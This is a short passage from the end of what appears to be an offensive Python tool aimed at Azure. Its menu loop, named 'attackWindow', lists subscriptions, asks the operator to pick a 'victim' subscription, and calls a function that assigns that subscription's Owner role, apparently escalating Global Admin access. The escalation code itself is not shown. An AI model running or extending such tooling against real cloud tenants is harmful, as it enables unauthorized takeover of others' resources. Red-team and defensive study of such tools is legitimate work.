                    print(make_table(field_names, rows))
                    TargetSubscriptionVictim = input("Choose Subscription [i.e. 0]: ")
                    Selection = int(TargetSubscriptionVictim)
                    print(GA_AssignSubscriptionOwnerRole(victims[Selection]["name"]))
            else:
                print("unkown command.")

try:
    attackWindow()
except KeyboardInterrupt:
    print("\nBye..Bye..!")